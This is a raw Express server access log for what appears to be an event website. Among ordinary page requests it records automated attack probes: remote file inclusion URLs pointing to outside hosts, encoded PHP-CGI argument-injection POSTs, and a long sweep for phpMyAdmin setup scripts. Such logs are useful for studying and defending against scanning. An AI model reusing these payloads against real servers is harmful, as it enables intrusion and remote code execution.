Express server listening on port 3000
[90mGET / [36m304 [90m18ms[0m
[90mGET /stylesheets/stylemain.css [32m200 [90m6ms - 9.02kb[0m
[90mGET /images/bg_body.png [32m200 [90m2ms - 174b[0m
[90mGET /images/img06.jpg [32m200 [90m1ms - 583b[0m
[90mGET /images/img06_hover.jpg [32m200 [90m3ms - 568b[0m
[90mGET /images/img_corner.png [32m200 [90m3ms - 342b[0m
[90mGET /images/carbon.png [32m200 [90m4ms - 214.07kb[0m
[90mHEAD / [32m200 [90m12ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /stylesheets/stylemain.css [36m304 [90m2ms[0m
[90mGET /images/bg_body.png [36m304 [90m1ms[0m
[90mGET /images/carbon.png [36m304 [90m0ms[0m
[90mGET /images/img06.jpg [36m304 [90m1ms[0m
[90mGET /images/img06_hover.jpg [36m304 [90m1ms[0m
[90mGET /images/img_corner.png [36m304 [90m1ms[0m
[90mGET /images/img06_hover.jpg [36m304 [90m1ms[0m
[90mGET / [36m304 [90m8ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /stylesheets/stylemain.css [36m304 [90m1ms[0m
[90mGET /images/bg_body.png [36m304 [90m1ms[0m
[90mGET /images/carbon.png [36m304 [90m1ms[0m
[90mGET /images/img06.jpg [36m304 [90m1ms[0m
[90mGET /images/img06_hover.jpg [36m304 [90m1ms[0m
[90mGET /images/img_corner.png [36m304 [90m1ms[0m
[90mOPTIONS /ipc$ [33m404 [90m1ms[0m
[90mOPTIONS /ipc$ [33m404 [90m1ms[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mHEAD / [32m200 [90m6ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m2ms[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /agenda [32m200 [90m10ms - 13.97kb[0m
[90mGET /stylesheets/stylemain.css [32m200 [90m2ms - 9.02kb[0m
[90mGET / [32m200 [90m10ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /stylesheets/stylemain.css [32m200 [90m2ms - 9.02kb[0m
[90mGET /images/bg_body.png [32m200 [90m2ms - 174b[0m
[90mGET /images/img_corner.png [32m200 [90m3ms - 342b[0m
[90mGET /images/carbon.png [32m200 [90m4ms - 214.07kb[0m
[90mGET /images/img06.jpg [32m200 [90m1ms - 583b[0m
[90mGET /images/img06_hover.jpg [32m200 [90m1ms - 568b[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /manager/html [33m404 [90m2ms[0m
[90mHEAD / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mHEAD / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m2ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET /?_SERVER[DOCUMENT_ROOT]=http://2.228.156.50/dta/pma.php? [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mHEAD / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m2ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /epgrec/systemSetting.php [33m404 [90m2ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /muieblackcat [33m404 [90m2ms[0m
[90mGET //phpMyAdmin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //MyAdmin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m2ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m4ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m2ms[0m
Error: ENOENT, open '/opt/wiz-business-co2/node_modules/express/node_modules/connect/node_modules/static-favicon/../public/favicon.ico'
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /admin/config.php [33m404 [90m2ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /sponsor [32m200 [90m3ms - 3.17kb[0m
[90mGET /stylesheets/stylemain.css [32m200 [90m2ms - 9.02kb[0m
[90mOPTIONS /ipc$ [33m404 [90m1ms[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m1ms[0m
Error: ENOENT, open '/opt/wiz-business-co2/node_modules/express/node_modules/connect/node_modules/static-favicon/../public/favicon.ico'
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m1ms[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
Error: ENOENT, open '/opt/wiz-business-co2/node_modules/express/node_modules/connect/node_modules/static-favicon/../public/favicon.ico'
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m1ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mOPTIONS /ipc$ [33m404 [90m1ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m11ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /index.php?page=http://218.206.179.11/TmDe3/pma.php? [33m404 [90m1ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mPOST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E [33m404 [90m2ms[0m
[90mPOST /cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E [33m404 [90m2ms[0m
[90mPOST /cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E [33m404 [90m1ms[0m
[90mPOST /cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E [33m404 [90m0ms[0m
[90mPOST /cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E [33m404 [90m0ms[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [36m304 [90m7ms[0m
[90mGET /stylesheets/stylemain.css [32m200 [90m2ms - 9.02kb[0m
[90mGET /images/bg_body.png [32m200 [90m2ms - 174b[0m
[90mGET /images/carbon.png [32m200 [90m3ms - 214.07kb[0m
[90mGET /images/img06.jpg [32m200 [90m1ms - 583b[0m
[90mGET /images/img06_hover.jpg [32m200 [90m1ms - 568b[0m
[90mGET /images/img_corner.png [32m200 [90m1ms - 342b[0m
[90mGET /images/wiz-icon.png [32m200 [90m5ms - 5.6kb[0m
[90mGET /images/img06_hover.jpg [36m304 [90m2ms[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m2ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /stylesheets/stylemain.css [32m200 [90m2ms - 9.02kb[0m
[90mGET /images/bg_body.png [32m200 [90m2ms - 174b[0m
[90mGET /images/carbon.png [32m200 [90m4ms - 214.07kb[0m
[90mGET /images/img_corner.png [32m200 [90m1ms - 342b[0m
[90mGET /images/img06.jpg [32m200 [90m1ms - 583b[0m
[90mGET /images/img06_hover.jpg [32m200 [90m1ms - 568b[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m1ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m1ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /speaker [32m200 [90m3ms - 2.79kb[0m
[90mGET /register [32m200 [90m3ms - 3.01kb[0m
[90mGET /event [32m200 [90m6ms - 9.75kb[0m
[90mGET /agenda [32m200 [90m7ms - 13.97kb[0m
[90mGET /sponsor [32m200 [90m2ms - 3.17kb[0m
[90mGET /stylesheets/stylemain.css [32m200 [90m3ms - 9.02kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
Error: ENOENT, open '/opt/wiz-business-co2/node_modules/express/node_modules/connect/node_modules/static-favicon/../public/favicon.ico'
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /web-console/ServerInfo.jsp [33m404 [90m2ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /stylesheets/stylemain.css [32m200 [90m2ms - 9.02kb[0m
[90mGET /images/carbon.png [32m200 [90m6ms - 214.07kb[0m
[90mGET /images/bg_body.png [32m200 [90m1ms - 174b[0m
[90mGET /images/img_corner.png [32m200 [90m1ms - 342b[0m
[90mGET /images/img06.jpg [32m200 [90m2ms - 583b[0m
[90mGET /images/img06_hover.jpg [32m200 [90m1ms - 568b[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m1ms[0m
[90mHEAD / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m9ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m2ms[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /sponsor [32m200 [90m3ms - 3.17kb[0m
[90mGET /event [32m200 [90m6ms - 9.75kb[0m
[90mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [90m1ms[0m
[90mGET /phpMyAdmin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET /phpmyadmin/scripts/setup.php [33m404 [90m3ms[0m
[90mGET /pma/scripts/setup.php [33m404 [90m1ms[0m
[90mGET /myadmin/scripts/setup.php [33m404 [90m0ms[0m
[90mGET /MyAdmin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET /agenda [32m200 [90m7ms - 13.97kb[0m
[90mGET /speaker [32m200 [90m2ms - 2.79kb[0m
[90mGET /register [32m200 [90m3ms - 3.01kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m4ms - 9.75kb[0m
[90mGET /muieblackcat [33m404 [90m2ms[0m
[90mGET //scripts/setup.php [33m404 [90m1ms[0m
[90mGET //mysql/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //mysqladmin/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpadmin/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpmyadmin/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //pma/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //websql/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //pma/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //sql/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-4.1.8/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin-4.1.9/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-4.1.10/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-4.1.11/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-4.0.0/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpmyadmin-4.1.8/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //php/phpmyadmin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpmyadmin/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-2.10.0.0/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-2.10.0.1/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-2.10.0.2/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-2.10.0/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin-2.10.1.0/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-2.10.2.0/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin-2.11.0.0/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin-2.11.1-all-languages/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin-2.11.1.0/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin-2.11.1.1/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin-2.11.1.2/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin-2.6.1-pl2/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin-2.6.1-pl3/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin-2.6.4-pl3/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin-2.6.4-pl4/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin-2.6.4-rc1/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-2.6.5/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin-2.6.6/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-2.6.9/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin-2.7.0-beta1/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin-2.7.0-pl1/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-2.7.0-pl2/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-2.7.0-rc1/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin-2.7.5/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-2.7.6/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-2.7.7/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-2.8.2.3/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-2.8.2/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin-2.8.3/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-2.8.4/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin-2.8.5/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin-2.8.6/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-2.8.7/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-2.8.8/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-2.8.9/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-2.9.0-rc1/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-3.1.2.0-english/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-3.1.2.0/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin-3.4.3.1/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin2/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpMyAdmin3/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //typo3/phpmyadmin/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpadmin/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //pma/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //web/phpMyAdmin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //xampp/phpmyadmin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //web/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //php-my-admin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //websql/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin-2/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //_phpmyadmin/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //administrator/components/com_joommyadmin/phpmyadmin/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //apache-default/phpmyadmin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //blog/phpmyadmin/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //cpanelphpmyadmin/scripts/setup.php [33m404 [90m0ms[0m
